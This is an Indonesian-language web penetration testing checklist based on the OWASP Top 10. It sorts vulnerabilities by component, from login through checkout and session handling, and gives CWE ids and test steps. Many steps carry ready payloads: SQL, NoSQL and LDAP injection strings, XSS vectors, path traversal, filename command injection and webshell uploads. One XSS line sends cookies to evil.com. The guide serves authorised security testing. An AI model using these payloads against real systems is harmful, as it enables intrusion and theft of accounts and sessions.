<p align="center">
  <img src="https://owasp.org/Top10/2021/assets/TOP_10_logo_Final_Logo_Colour.png" alt="OWASPTOP10 Logo" width="990">
</p>


#### Panduan Penetration Testing Web Application Daftar Kerentanan Berdasarkan Komponen Web/Aplikasi
> Dokumen ini disusun berdasarkan pendekatan komprehensif dengan mengelompokkan kerentanan berdasarkan area fungsional aplikasi web. Setiap bagian mencakup daftar lengkap CWE, deskripsi, dan langkah-langkah pengujian detail.

![OSINT](https://img.shields.io/badge/PEN7EST-DOC-orange)

---

| ![](images/WEAREPEN7EST.png) |
|:--:|
|  | 

## DAFTAR ISI BERDASARKAN KOMPONEN

1. [Halaman Login](#1-halaman-login)
2. [Halaman Registrasi](#2-halaman-registrasi)
3. [Halaman Lupa/Reset Password](#3-halaman-lupa--reset-password)
4. [Halaman Profil & Manajemen Akun](#4-halaman-profil--manajemen-akun)
5. [Fitur Pencarian](#5-fitur-pencarian)
6. [Form Upload File](#6-form-upload-file)
7. [API Endpoints](#7-api-endpoints)
8. [Halaman Admin](#8-halaman-admin)
9. [Fitur Checkout/Pembayaran](#9-fitur-checkout--pembayaran)
10. [Cookie & Session Handling](#10-cookie--session-handling)
11. [HTTP Headers & Konfigurasi Server](#11-http-headers--konfigurasi-server)
12. [Fitur Ekspor/Import Data](#12-fitur-ekspor--import-data)

---

## 1. Halaman Login

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 1.1 | **SQL Injection** | CWE-89 | Memungkinkan penyerang melewati autentikasi dengan memanipulasi query login | • Input `' OR '1'='1' --` di field username<br>• Input `admin' --` di username dengan password sembarang<br>• Input `' UNION SELECT 1, 'admin', 'hash' --`<br>• Gunakan time-based payload: `' OR SLEEP(5)=0--`<br>• Cek error message yang mengindikasikan database |
| 1.2 | **NoSQL Injection** | CWE-943 | Khusus untuk aplikasi MongoDB, memanipulasi query JSON | • Input `{ "$ne": "" }` di field password<br>• Input `{ "$gt": "" }` untuk bypass<br>• Input `admin' && this.password.match(/.*/)//`<br>• Coba payload: `' || '1'=='1` |
| 1.3 | **Brute Force Attack** | CWE-307 | Tidak ada pembatasan percobaan login | • Coba 100+ percobaan login dengan password berbeda<br>• Uji apakah ada CAPTCHA setelah 3-5 gagal login<br>• Uji apakah ada lockout account setelah beberapa kali gagal<br>• Coba dengan tools seperti Hydra atau Burp Intruder |
| 1.4 | **Credential Stuffing** | CWE-521 | Menggunakan kredensial dari kebocoran data sebelumnya | • Gunakan daftar password umum (top 1000)<br>• Coba kombinasi username:password umum<br>• Uji dengan password default: admin/admin, admin/password123 |
| 1.5 | **Username Enumeration** | CWE-203 | Perbedaan pesan error memungkinkan identifikasi user valid | • Cek pesan: "Username tidak ditemukan" vs "Password salah"<br>• Cek perbedaan waktu respons antara user valid vs invalid<br>• Cek perbedaan kode status HTTP<br>• Cek perbedaan konten halaman |
| 1.6 | **Weak Password Policy** | CWE-521 | Password mudah ditebak karena aturan lemah | • Coba daftar dengan password: "123456", "password", "admin123"<br>• Uji minimal panjang password (harus >= 8)<br>• Uji requirement kombinasi huruf, angka, simbol<br>• Uji apakah bisa menggunakan password yang sama dengan username |
| 1.7 | **Insecure Remember Me** | CWE-257 | Fitur "Ingat Saya" menyimpan kredensial tidak aman | • Cek apakah "remember me" menggunakan cookie yang dapat diprediksi<br>• Cek apakah cookie berisi username dalam plaintext<br>• Cek apakah cookie bisa digunakan selamanya tanpa kadaluarsa<br>• Coba steal cookie dan gunakan di browser lain |
| 1.8 | **Man-in-the-Middle (MITM)** | CWE-319 | Login dikirim melalui HTTP (tidak terenkripsi) | • Cek apakah halaman login menggunakan HTTPS<br>• Cek apakah ada redirect dari HTTP ke HTTPS<br>• Gunakan Wireshark untuk capture traffic login<br>• Cek apakah HSTS diimplementasikan |
| 1.9 | **Session Fixation** | CWE-384 | Session ID tidak berubah setelah login | • Dapatkan session ID sebelum login<br>• Login dengan kredensial valid<br>• Cek apakah session ID berubah setelah login<br>• Jika tidak berubah, rentan session fixation |
| 1.10 | **Cross-Site Scripting (XSS)** | CWE-79 | Inject skrip melalui field login | • Input `<script>alert(1)</script>` di username<br>• Input `"><script>alert(1)</script>`<br>• Input `javascript:alert(1)`<br>• Cek apakah input direfleksikan di halaman error |
| 1.11 | **CSRF on Login Form** | CWE-352 | Membuat pengguna login ke akun penyerang | • Buat halaman HTML dengan form yang auto-submit ke target<br>• Host di server penyerang<br>• Kirim link ke korban<br>• Jika korban terautentikasi, bisa dialihkan |
| 1.12 | **Default Credentials** | CWE-798 | Menggunakan kredensial bawaan vendor | • Coba kombinasi admin/admin, admin/password<br>• Cek dokumentasi aplikasi untuk default creds<br>• Coba username: root, administrator, admin, user<br>• Coba password: admin, password, 123456, root |
| 1.13 | **Rate Limiting Bypass** | CWE-770 | Membypass pembatasan percobaan login | • Coba rotate IP dengan X-Forwarded-For header<br>• Coba gunakan banyak akun berbeda<br>• Coba tunggu dan lanjutkan setelah cooldown<br>• Coba gunakan metode slow attack |
| 1.14 | **LDAP Injection** | CWE-90 | Untuk aplikasi yang menggunakan LDAP authentication | • Input `*` di username<br>• Input `admin*` di username<br>• Input `)(uid=*`<br>• Input `| (username=*)(password=*)` |
| 1.15 | **OAuth Misconfiguration** | CWE-287 | Kelemahan pada implementasi OAuth/SSO | • Cek apakah redirect_uri tervalidasi dengan benar<br>• Cek apakah state parameter digunakan<br>• Cek CSRF pada OAuth flow<br>• Coba ganti client_id dengan milik sendiri |

---

## 2. Halaman Registrasi

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 2.1 | **Mass Assignment** | CWE-915 | Memodifikasi parameter tersembunyi saat registrasi | • Tambahkan parameter `is_admin=true` di request<br>• Tambahkan `role=administrator`<br>• Tambahkan `approved=1`<br>• Cek apakah bisa mendaftar sebagai admin |
| 2.2 | **Username/Email Enumeration** | CWE-203 | Mendeteksi apakah username/email sudah terdaftar | • Daftar dengan email sudah ada, cek pesan error<br>• Daftar dengan username sudah ada<br>• Bandingkan waktu respons antara email baru vs existing |
| 2.3 | **Weak Password Policy** | CWE-521 | Password mudah ditebak | • Coba daftar dengan password "123"<br>• Coba tanpa huruf besar/kecil<br>• Coba tanpa angka/simbol<br>• Coba dengan username sebagai password |
| 2.4 | **Email Verification Bypass** | CWE-287 | Melewati verifikasi email | • Cek apakah akun langsung aktif tanpa verifikasi email<br>• Cek apakah bisa login tanpa verifikasi<br>• Cek apakah token verifikasi bisa ditebak<br>• Coba gunakan email dengan format tidak valid |
| 2.5 | **Duplicate Registration** | CWE-841 | Mendaftar dengan data yang sama berulang kali | • Coba daftar dengan email yang sama berkali-kali<br>• Cek apakah ada limitasi registrasi per IP<br>• Cek apakah sistem mencegah multiple akun |
| 2.6 | **Stored XSS** | CWE-79 | Menyimpan skrip jahat di database melalui registrasi | • Daftar dengan username `<script>alert(1)</script>`<br>• Daftar dengan nama `<img src=x onerror=alert(1)>`<br>• Cek apakah data ini tampil di halaman lain (admin panel) |
| 2.7 | **SQL Injection** | CWE-89 | Inject SQL melalui field registrasi | • Username: `admin'--`<br>• Email: `test@test.com' OR '1'='1`<br>• Password: `' OR SLEEP(5)=0` |
| 2.8 | **Race Condition** | CWE-362 | Registrasi ganda dalam waktu bersamaan | • Kirim multiple request registrasi bersamaan (race condition)<br>• Cek apakah terjadi duplikasi data<br>• Cek apakah sistem crash atau error |
| 2.9 | **Weak CAPTCHA Implementation** | CWE-804 | CAPTCHA mudah dipecahkan atau dilewati | • Cek apakah CAPTCHA bisa di-refresh tanpa limit<br>• Cek apakah CAPTCHA bisa dipecahkan dengan OCR<br>• Coba hapus parameter CAPTCHA dari request<br>• Coba gunakan ulang token CAPTCHA yang sama |
| 2.10 | **Privacy Violation** | CWE-359 | Data pribadi terekspos | • Cek apakah password dikirim dalam plaintext<br>• Cek apakah data sensitif tampil di response<br>• Cek apakah ada logging data sensitif |
| 2.11 | **Invitation/Referral Abuse** | CWE-840 | Penyalahgunaan kode undangan | • Coba generate banyak akun dengan kode referral yang sama<br>• Coba gunakan kode referral expired<br>• Coba tebak kode referral yang valid |
| 2.12 | **Terms & Conditions Bypass** | CWE-693 | Menyetujui T&C tanpa benar-benar menyetujui | • Hapus parameter `agree_to_terms` dari request<br>• Ubah nilai dari `false` ke `true`<br>• Cek apakah bisa daftar tanpa checklist |

---

## 3. Halaman Lupa / Reset Password

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 3.1 | **Token Predictable** | CWE-330 | Token reset password mudah ditebak | • Request 10 token reset, analisis pola<br>• Apakah token berbasis timestamp?<br>• Apakah token increment (token1, token2)?<br>• Apakah token = hash(email)? |
| 3.2 | **Token Exposure in URL** | CWE-598 | Token reset tampil di referer header atau log | • Cek apakah token ada di URL<br>• Cek apakah token dikirim melalui HTTP<br>• Cek apakah token tampil di browser history<br>• Cek apakah token tampil di server logs |
| 3.3 | **Token Not Expired** | CWE-613 | Token reset masih bisa digunakan setelah kadaluarsa | • Request token, tunggu 24 jam, coba gunakan<br>• Gunakan token setelah password direset (seharusnya invalid)<br>• Gunakan token setelah logout |
| 3.4 | **Weak Token Generation** | CWE-331 | Token menggunakan entropi rendah | • Analisis panjang token (minimal 16 karakter)<br>• Apakah token menggunakan angka saja?<br>• Apakah token menggunakan karakter set kecil? |
| 3.5 | **Email Enumeration** | CWE-203 | Mengetahui apakah email terdaftar | • Request reset untuk email random vs email valid<br>• Bandingkan pesan error<br>• Bandingkan waktu respons |
| 3.6 | **Host Header Injection** | CWE-74 | Memanipulasi link reset yang dikirim | • Ubah Host header ke domain penyerang<br>• Tambahkan X-Forwarded-Host<br>• Jika email reset menggunakan host dari header, bisa redirect |
| 3.7 | **Password Reset Poisoning** | CWE-601 | Memodifikasi link reset untuk redirect ke site jahat | • Tambahkan parameter `redirect_uri=http://evil.com`<br>• Tambahkan `next=http://evil.com`<br>• Tambahkan `returnTo=http://evil.com` |
| 3.8 | **User ID Manipulation** | CWE-639 | Mengganti ID user saat reset password | • Intercept request reset password<br>• Ubah parameter `user_id` ke ID orang lain<br>• Ubah parameter `email` ke email orang lain<br>• Cek apakah bisa reset password orang lain |
| 3.9 | **Password Change Without Old Password** | CWE-620 | Mereset password tanpa verifikasi old password | • Akses halaman change password langsung<br>• Cek apakah diminta old password<br>• Coba langsung ganti password baru |
| 3.10 | **CSRF on Reset Password** | CWE-352 | Membuat korban mereset passwordnya | • Buat form auto-submit ke endpoint reset<br>• Jika tidak ada CSRF token, bisa dieksploitasi |
| 3.11 | **Account Takeover via Email** | CWE-640 | Jika email korban sudah dikompromi | • Cek apakah email verifikasi diperlukan<br>• Cek apakah ada notifikasi ke email lama saat email diubah |
| 3.12 | **Rate Limiting on Reset Request** | CWE-770 | Spam request reset password | • Kirim 100 request reset ke email yang sama<br>• Cek apakah ada pembatasan<br>• Cek apakah bisa membanjiri email korban |
| 3.13 | **Security Questions Bypass** | CWE-640 | Pertanyaan keamanan mudah ditebak | • Coba jawab dengan informasi publik (tanggal lahir, nama ibu)<br>• Cek apakah pertanyaan case sensitive<br>• Cek apakah ada limitasi percobaan |
| 3.14 | **Open Redirect** | CWE-601 | Redirect ke situs eksternal setelah reset | • Cek parameter `redirect` di URL reset<br>• Coba `redirect=http://evil.com`<br>• Jika berhasil redirect, bisa untuk phishing |

---

## 4. Halaman Profil & Manajemen Akun

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 4.1 | **IDOR pada Profil** | CWE-639 | Mengakses profil orang lain dengan mengubah ID | • Ubah `/profile?id=123` ke `/profile?id=124`<br>• Ubah `/api/user/me` ke `/api/user/124`<br>• Coba akses dengan metode enumerasi |
| 4.2 | **Stored XSS di Profil** | CWE-79 | Menyimpan XSS di field profil | • Isi field "About Me" dengan `<script>alert(1)</script>`<br>• Isi nama dengan payload XSS<br>• Cek apakah tampil di halaman profil orang lain |
| 4.3 | **Mass Assignment pada Update Profil** | CWE-915 | Mengubah field yang tidak seharusnya | • Tambahkan parameter `is_admin=true` saat update profil<br>• Tambahkan `role=administrator`<br>• Tambahkan `balance=1000000`<br>• Tambahkan `verified=true` |
| 4.4 | **Email Change Without Verification** | CWE-620 | Mengubah email tanpa verifikasi | • Coba ubah email ke alamat baru<br>• Cek apakah perlu verifikasi email baru<br>• Cek apakah notifikasi dikirim ke email lama |
| 4.5 | **Account Deletion Issues** | CWE-841 | Masalah saat hapus akun | • Cek apakah akun benar-benar terhapus<br>• Cek apakah masih bisa login setelah hapus<br>• Cek apakah data masih tersisa di database |
| 4.6 | **Privacy Data Exposure** | CWE-359 | Data pribadi tampil di response API | • Cek response API untuk field sensitif<br>• Cek apakah ada data hidden yang terekspos<br>• Cek apakah password hash tampil |
| 4.7 | **Avatar Upload Vulnerabilities** | CWE-434 | Upload file berbahaya sebagai avatar | • Upload file PHP sebagai avatar<br>• Upload file dengan ekstensi ganda (shell.jpg.php)<br>• Upload file dengan magic number palsu |
| 4.8 | **Phone Number/Email Enumeration** | CWE-203 | Mengetahui data kontak user lain | • Coba fitur "Cari teman" atau "Find by email"<br>• Cek apakah bisa mencari user dengan email<br>• Cek apakah ada autocomplete yang mengekspos data |
| 4.9 | **2FA Bypass** | CWE-287 | Melewati Two-Factor Authentication | • Cek apakah 2FA bisa di-skip<br>• Cek apakah kode 2FA bisa dibruteforce<br>• Cek apakah 2FA hanya di beberapa halaman |
| 4.10 | **Session Invalidation After Password Change** | CWE-613 | Sesi lama masih aktif setelah ganti password | • Ganti password di satu browser<br>• Coba akses dengan session lama di browser lain<br>• Seharusnya session lama di-logout |
| 4.11 | **Activity Log Bypass** | CWE-778 | Aksi tidak tercatat di log aktivitas | • Lakukan perubahan profil, cek apakah tercatat<br>• Cek apakah user bisa melihat log sendiri<br>• Cek apakah admin bisa melihat log user |
| 4.12 | **CSRF pada Update Profil** | CWE-352 | Mengubah data profil korban tanpa sepengetahuan | • Buat form yang auto-submit ke endpoint update profil<br>• Jika tidak ada CSRF token, bisa mengubah data korban |

---

## 5. Fitur Pencarian

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 5.1 | **SQL Injection** | CWE-89 | Inject SQL melalui parameter pencarian | • Cari dengan `' OR '1'='1`<br>• Cari dengan `' UNION SELECT null, version()--`<br>• Cari dengan `' AND SLEEP(5)=0--` |
| 5.2 | **XSS (Reflected)** | CWE-79 | Skrip tereksekusi dari hasil pencarian | • Cari `<script>alert(1)</script>`<br>• Cari `<img src=x onerror=alert(1)>`<br>• Cari `"><svg onload=alert(1)>` |
| 5.3 | **NoSQL Injection** | CWE-943 | Untuk aplikasi MongoDB | • Cari `[$ne]=null`<br>• Cari `[$regex]=.*`<br>• Cari `{$gt: ''}` |
| 5.4 | **LDAP Injection** | CWE-90 | Untuk aplikasi dengan LDAP directory | • Cari `*`<br>• Cari `admin*`<br>• Cari `)(|(uid=*` |
| 5.5 | **Information Disclosure** | CWE-200 | Hasil pencarian mengekspos data sensitif | • Cari dengan karakter khusus untuk memicu error<br>• Cek apakah error menampilkan query SQL<br>• Cek apakah error menampilkan path server |
| 5.6 | **Denial of Service (ReDoS)** | CWE-1333 | Regular Expression DoS | • Cari dengan input `((a+a+)+)+`<br>• Cari dengan ribuan karakter<br>• Cek apakah server menjadi lambat |
| 5.7 | **Blind Boolean Injection** | CWE-89 | Inferensi data berdasarkan true/false | • Cari `' AND 1=1--` (harus sama dengan normal)<br>• Cari `' AND 1=2--` (harus beda hasil)<br>• Bandingkan jumlah hasil pencarian |
| 5.8 | **Search Result Manipulation** | CWE-807 | Memanipulasi urutan atau filter hasil | • Cek parameter sort/order<br>• Coba SQL injection di order by clause<br>• Cek parameter filter yang tidak divalidasi |
| 5.9 | **Rate Limiting Bypass** | CWE-770 | Melakukan terlalu banyak pencarian | • Kirim 1000 request pencarian cepat<br>• Cek apakah ada pembatasan<br>• Cek apakah bisa membanjiri server |
| 5.10 | **Autocomplete Data Exposure** | CWE-202 | Fitur autocomplete mengekspos data sensitif | • Ketik huruf di search box, lihat suggestion<br>• Cek apakah suggestion berasal dari data user lain<br>• Cek apakah ada data sensitif di suggestion |

---

## 6. Form Upload File

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 6.1 | **Unrestricted File Upload** | CWE-434 | Upload file berbahaya (web shell) | • Upload file `.php` berisi webshell<br>• Upload file `.asp`, `.jsp`, `.exe`<br>• Upload file `.htaccess` malicious<br>• Coba akses file yang diupload |
| 6.2 | **Path Traversal** | CWE-22 | Menyimpan file di direktori sensitif | • Ubah filename ke `../../etc/passwd`<br>• Ubah path upload dengan `../`<br>• Coba timpa file sistem |
| 6.3 | **MIME Type Bypass** | CWE-807 | Memalsukan tipe file | • Upload PHP dengan Content-Type: image/jpeg<br>• Upload PHP dengan magic number GIF89a di awal<br>• Cek apakah validasi hanya berdasarkan header |
| 6.4 | **Double Extensions** | CWE-434 | Mengecoh validasi ekstensi | • Upload `shell.php.jpg`<br>• Upload `shell.php;.jpg`<br>• Upload `shell.php%00.jpg` (null byte) |
| 6.5 | **XSS via File Upload** | CWE-79 | File dengan konten HTML/JavaScript | • Upload file HTML dengan `<script>alert(1)</script>`<br>• Upload SVG dengan embedded JavaScript<br>• Upload file dengan nama `<script>alert(1)</script>.jpg` |
| 6.6 | **XML External Entity (XXE)** | CWE-611 | Untuk upload file XML/SVG | • Upload SVG dengan XXE payload<br>• Upload XML dengan entity eksternal<br>• Coba baca file `/etc/passwd` |
| 6.7 | **Denial of Service** | CWE-400 | Upload file sangat besar atau banyak | • Upload file 1GB (jika ada)<br>• Upload ribuan file kecil sekaligus<br>• Upload file dengan kompresi zip bomb |
| 6.8 | **File Permission Issues** | CWE-732 | File yang diupload memiliki permission tidak aman | • Cek permission file yang diupload (harus 644)<br>• Cek apakah file bisa dieksekusi<br>• Cek apakah direktori upload bisa di-list |
| 6.9 | **Metadata Exposure** | CWE-200 | Metadata file mengekspos informasi sensitif | • Upload file dengan EXIF data (GPS lokasi)<br>• Cek apakah metadata ditampilkan<br>• Upload PDF dengan hidden data |
| 6.10 | **Race Condition pada Upload** | CWE-362 | Upload file secara bersamaan | • Upload file yang sama berkali-kali bersamaan<br>• Cek apakah terjadi duplikasi atau error<br>• Cek apakah sistem crash |
| 6.11 | **Insecure Direct Object References** | CWE-639 | Mengakses file orang lain | • Coba akses `/uploads/123.jpg`<br>• Ubah ke `/uploads/124.jpg`<br>• Enumerate ID file |
| 6.12 | **File Name Injection** | CWE-78 | Command injection via file name | • Upload file dengan nama `;whoami;.jpg`<br>• Upload file dengan nama `$(whoami).jpg`<br>• Cek apakah sistem memproses nama file |
| 6.13 | **Zip Slip** | CWE-22 | Path traversal via ZIP file | • Upload ZIP dengan file `../../etc/passwd`<br>• Cek apakah ekstraksi menimpa file sistem |
| 6.14 | **Cross-Origin Resource Sharing (CORS)** | CWE-942 | CORS misconfiguration pada file storage | • Cek header Access-Control-Allow-Origin: *<br>• Cek apakah credentials diizinkan dari origin asing |

---

## 7. API Endpoints

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 7.1 | **Broken Object Level Authorization** | CWE-639 | IDOR pada API | • Ubah ID di endpoint `/api/users/123`<br>• Ubah di body JSON `{"user_id":123}`<br>• Enumerate UUID jika bisa ditebak |
| 7.2 | **Broken Authentication** | CWE-287 | API tanpa autentikasi | • Cek endpoint sensitif tanpa token<br>• Cek apakah API key bisa ditebak<br>• Cek apakah JWT token tanpa signature |
| 7.3 | **Broken Function Level Authorization** | CWE-285 | Akses fungsi admin via API | • Coba endpoint `/api/admin/users` dengan user biasa<br>• Coba metode DELETE di endpoint user biasa<br>• Coba akses endpoint dengan role rendah |
| 7.4 | **Mass Assignment** | CWE-915 | Menambahkan parameter ekstra di JSON | • Tambah `"is_admin": true` di body request<br>• Tambah `"role": "admin"`<br>• Tambah `"balance": 999999` |
| 7.5 | **Excessive Data Exposure** | CWE-200 | API mengembalikan data sensitif | • Cek response untuk field password hash<br>• Cek untuk internal IP, token, API key<br>• Cek untuk data pengguna lain |
| 7.6 | **Rate Limiting Issues** | CWE-770 | API tanpa pembatasan request | • Kirim 1000 request per detik<br>• Cek apakah ada throttling<br>• Cek apakah bisa DoS dengan banyak request |
| 7.7 | **Injection di Parameter API** | CWE-89 | SQL/NoSQL injection via JSON | • Di parameter: `{"username": "admin'--"}`<br>• Di parameter: `{"id": {"$ne": null}}`<br>• Di parameter: `{"search": {"$regex": ".*"}}` |
| 7.8 | **JWT Issues** | CWE-347 | Kelemahan implementasi JWT | • Cek apakah signature divalidasi<br>• Cek algoritma none: `"alg": "none"`<br>• Cek apakah bisa ganti RS256 ke HS256<br>• Cek apakah secret key lemah |
| 7.9 | **CORS Misconfiguration** | CWE-942 | CORS terlalu permisif | • Cek Access-Control-Allow-Origin: *<br>• Cek apakah credentials diizinkan dari origin manapun<br>• Cek preflight OPTIONS response |
| 7.10 | **GraphQL Introspection & Abuse** | CWE-200 | GraphQL introspection enabled | • Query `__schema` untuk mapping semua data<br>• Coba depth query besar untuk DoS<br>• Coba query sirkular untuk resource exhaustion |
| 7.11 | **Server-Side Request Forgery** | CWE-918 | API bisa meminta resource internal | • Cari parameter URL: `?url=http://internal:8080`<br>• Coba akses metadata AWS: `169.254.169.254`<br>• Coba akses localhost: `127.0.0.1:3306` |
| 7.12 | **SQL Injection via GraphQL** | CWE-89 | Inject SQL di GraphQL arguments | • Buat query dengan argument `id: "1 OR 1=1"`<br>• Gunakan alias untuk blind injection |
| 7.13 | **Insecure Direct Object References via UUID** | CWE-639 | UUID yang bisa ditebak | • Jika UUID versi 1 (timestamp-based), bisa diprediksi<br>• Jika UUID pendek, bisa di-bruteforce<br>• Cek dokumentasi generation method |
| 7.14 | **HTTP Method Tampering** | CWE-650 | Metode HTTP alternatif tidak diamankan | • Coba GET ke endpoint yang seharusnya POST<br>• Coba HEAD, OPTIONS, TRACE<br>• Cek apakah metode berbahaya diaktifkan |
| 7.15 | **API Key in URL** | CWE-598 | API key tampil di URL | • Cek apakah API key ada di query string<br>• Bisa tercatat di logs, history browser<br>• Harusnya di header Authorization |

---

## 8. Halaman Admin

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 8.1 | **Privilege Escalation** | CWE-269 | User biasa jadi admin | • Coba akses `/admin` langsung<br>• Coba akses `/administrator`<br>• Coba akses `/dashboard` dengan session user biasa |
| 8.2 | **IDOR di Panel Admin** | CWE-639 | Akses data user lain | • Di admin panel, ubah parameter user_id<br>• Coba akses data user yang tidak berhak<br>• Coba modifikasi data user lain |
| 8.3 | **Stored XSS** | CWE-79 | XSS di panel admin | • Upload XSS di data yang dilihat admin<br>• Jika admin melihatnya, bisa steal session admin<br>• Complete account takeover |
| 8.4 | **SQL Injection di Fitur Admin** | CWE-89 | Fitur admin dengan input tidak aman | • Filter data user dengan injection<br>• Export data dengan injection<br>• Fitur search di admin panel |
| 8.5 | **File Upload di Admin** | CWE-434 | Upload webshell via admin features | • Upload tema/modul baru<br>• Upload plugin<br>• Upload file konfigurasi |
| 8.6 | **Command Injection** | CWE-78 | Fitur admin yang execute system command | • Fitur backup/restore<br>• Fitur ping/traceroute dari admin<br>• Fitur system update |
| 8.7 | **Insecure Direct Object References** | CWE-639 | Hapus/edit user lain | • Coba hapus user dengan ID berbeda<br>• Coba edit privilege user lain<br>• Coba lock/unlock user |
| 8.8 | **Information Disclosure** | CWE-200 | Dashboard menampilkan informasi sensitif | • Cek apakah ada password di page source<br>• Cek apakah ada internal IP, database credentials<br>• Cek apakah ada API keys |
| 8.9 | **Default Admin Password** | CWE-798 | Password admin masih default | • Coba admin/admin, admin/password<br>• Cek dokumentasi untuk default creds<br>• Coba kombinasi umum |
| 8.10 | **Session Management Issues** | CWE-613 | Session admin tidak timeout | • Login sebagai admin, biarkan 24 jam<br>• Cek apakah masih login<br>• Seharusnya session timeout |
| 8.11 | **CSRF di Fungsi Admin** | CWE-352 | Membuat admin melakukan aksi tanpa sadar | • Buat request ke user/create<br>• Buat request ke system/shutdown<br>• Jika admin visit page, aksi tereksekusi |
| 8.12 | **Log Injection** | CWE-117 | Memalsukan log admin | • Input newline di parameter: `admin\n[INFO] User login`<br>• Bisa memalsukan log entry<br>• Bisa menutupi jejak attack |
| 8.13 | **Brute Force Admin Login** | CWE-307 | Tidak ada proteksi di admin login | • Coba brute force password admin<br>• Jika tidak ada rate limiting, bisa tembus |
| 8.14 | **Admin Panel Discovery** | CWE-200 | Admin panel mudah ditemukan | • Coba /admin, /administrator, /backend<br>• Coba /wp-admin (WordPress)<br>• Coba /manager (Tomcat) |

---

## 9. Fitur Checkout / Pembayaran

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 9.1 | **Price Manipulation** | CWE-840 | Mengubah harga di request | • Intercept request checkout<br>• Ubah parameter `price=1000` ke `price=1`<br>• Ubah `total=100000` ke `total=0` |
| 9.2 | **Quantity Manipulation** | CWE-840 | Mengubah jumlah barang | • Ubah `quantity=1` ke `quantity=-1`<br>• Ubah ke `quantity=999999`<br>• Cek apakah stok berkurang sesuai |
| 9.3 | **IDOR di Order** | CWE-639 | Melihat order orang lain | • Ubah `/order/123` ke `/order/124`<br>• Cek apakah bisa lihat detail order orang<br>• Cek apakah bisa batalkan order orang |
| 9.4 | **Race Condition** | CWE-362 | Menggunakan kode promo berkali-kali | • Kirim 100 request pakai kode promo bersamaan<br>• Cek apakah kode terpakai sekali atau berkali-kali<br>• Bisa abuse diskon |
| 9.5 | **Coupon/Code Abuse** | CWE-840 | Memanipulasi kode promo | • Coba tebak kode promo<br>• Coba gunakan kode expired<br>• Coba kombinasikan multiple kode |
| 9.6 | **Payment Gateway Bypass** | CWE-287 | Melewati pembayaran | • Cek apakah order langsung active tanpa pembayaran<br>• Cek apakah status pembayaran bisa diubah manual<br>• Cek parameter `paid=true` |
| 9.7 | **Credit Card Information Leak** | CWE-312 | Data kartu kredit tersimpan tidak aman | • Cek apakah nomor kartu di-log<br>• Cek apakah CVV disimpan (tidak boleh)<br>• Cek apakah response API mengandung PAN |
| 9.8 | **Refund Manipulation** | CWE-840 | Mengeksploitasi proses refund | • Minta refund berkali-kali untuk order yang sama<br>• Cek apakah refund > amount yang dibayar<br>• Cek refund ke akun berbeda |
| 9.9 | **Insecure Direct Object References di Invoice** | CWE-639 | Mengakses invoice orang lain | • Enumerate nomor invoice<br>• Cek apakah invoice bisa diakses tanpa login |
| 9.10 | **Business Logic Flaw - Negative Shopping** | CWE-840 | Memanipulasi quantity negative | • Tambah item dengan quantity -1 (mengurangi total)<br>• Kombinasikan negative dan positive untuk free item |

---

## 10. Cookie & Session Handling

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 10.1 | **Missing Secure Flag** | CWE-614 | Cookie dikirim melalui HTTP | • Cek cookie dengan browser dev tools<br>• Pastikan ada flag `Secure`<br>• Jika tidak ada, cookie bisa dicuri di jaringan HTTP |
| 10.2 | **Missing HttpOnly Flag** | CWE-1004 | Cookie bisa diakses JavaScript | • Cek cookie, apakah ada `HttpOnly`<br>• Jika tidak ada, XSS bisa steal cookie<br>• Coba document.cookie di console |
| 10.3 | **Missing SameSite Flag** | CWE-1275 | Cookie dikirim dalam cross-site requests | • Cek cookie, apakah ada `SameSite`<br>• `SameSite=Lax` atau `Strict` lebih aman<br>• Tanpa ini, rentan CSRF |
| 10.4 | **Session Fixation** | CWE-384 | Session ID tidak berubah setelah login | • Set session ID sebelum login<br>• Login, cek apakah session ID berubah<br>• Jika sama, attacker bisa pakai session itu |
| 10.5 | **Session Timeout Not Implemented** | CWE-613 | Session tidak pernah kadaluarsa | • Login, tutup browser, buka lagi besok<br>• Cek apakah masih login<br>• Seharusnya session expire |
| 10.6 | **Predictable Session Token** | CWE-330 | Session ID mudah ditebak | • Kumpulkan 100 session ID, analisis pola<br>• Apakah increment? (123, 124, 125)<br>• Apakah timestamp-based? |
| 10.7 | **Session Tokens in URL** | CWE-598 | Session ID di URL | • Cek apakah ada `?sessionid=123` di URL<br>• Bisa tercatat di browser history, logs<br>• Bisa di-share tidak sengaja |
| 10.8 | **Logout Function Not Destroying Session** | CWE-613 | Session masih valid setelah logout | • Logout, lalu coba pakai cookie lama<br>• Jika masih bisa akses, session tidak dihapus |
| 10.9 | **Concurrent Session Handling** | CWE-613 | Bisa login dari banyak tempat tanpa notifikasi | • Login dari 5 browser berbeda<br>• Cek apakah ada notifikasi<br>• Cek apakah ada limitasi session |
| 10.10 | **Cookie Scope Too Broad** | CWE-1004 | Cookie berlaku untuk semua subdomain | • Cek domain cookie: `.example.com`<br>• Jika ada subdomain vulnerable, bisa steal cookie |
| 10.11 | **Session Hijacking via XSS** | CWE-79 | XSS bisa steal cookie jika HttpOnly tidak ada | • Inject XSS: `<script>fetch('evil.com?c='+document.cookie)</script>`<br>• Jika HttpOnly tidak ada, cookie tercuri |
| 10.12 | **Session Puzzling** | CWE-384 | Manipulasi variable session | • Coba set session variable melalui parameter<br>• Cek apakah bisa overwrite variable penting |

---

## 11. HTTP Headers & Konfigurasi Server

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
